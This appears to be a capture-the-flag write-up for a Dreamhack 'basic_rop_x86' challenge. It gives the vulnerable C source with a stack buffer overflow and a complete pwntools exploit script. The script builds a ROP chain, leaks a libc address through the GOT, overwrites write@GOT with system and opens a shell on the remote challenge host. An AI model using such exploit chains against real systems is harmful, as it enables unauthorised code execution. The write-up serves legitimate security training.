## basic_rop_x86
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

<br><br>

## Solution
---

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

<br>

```python
from pwn import *

#p = process('./basic_rop_x86')
p = remote('host3.dreamhack.games',16384)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
pop_pop_pop_ret = 0x08048689

# payload
# overflow + pppr + write(1,read@got,length) + read(0,write@got,length) + write(/bin/sh)

payload = b"A"*0x44 + b"BBBB"

# write(1,read@got,len)
payload += p32(write_plt) # main return to write@plt
payload += p32(pop_pop_pop_ret)
payload += p32(1) + p32(read_got) + p32(len(str(read_got)))

# read(0, write@got, len)
payload += p32(read_plt)
payload += p32(pop_pop_pop_ret)
payload += p32(0) + p32(write_got) + p32(0x70)

# write('/bin/sh')
payload += p32(write_plt)
payload += p32(0xabcd)
payload += p32(write_got+0x4)

p.send(payload)
p.recv()
read_addr = u32(p.recvn(4))
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

print("@ libc : ", hex(libc_base))
print("@ system :", hex(system_addr))
p.send(p32(system_addr)+b'/bin/sh\x00')

p.interactive()
```
